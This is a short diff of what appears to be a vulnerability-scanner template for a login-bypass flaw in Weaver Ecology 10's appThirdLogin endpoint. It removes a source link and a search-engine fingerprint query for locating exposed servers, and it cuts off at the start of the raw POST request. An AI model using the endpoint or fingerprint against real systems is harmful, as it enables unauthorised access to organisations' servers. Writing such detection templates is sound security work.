@@ -3,12 +3,8 @@ info:
   name: 泛微-ecology-10-appThirdLogin-登录绕过漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/ibyt7faga5y18nxs'
+  description: ''
   tags: unauth,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: ibyt7faga5y18nxs
-    fofa: body="/build/passport/static/js/lib.js" || body="/build/ecodesdk/static/js/lib.js"||icon_hash="-1619753057"
 http:
 - raw:
   - 'POST /papi/passport/rest/appThirdLogin HTTP/1.1
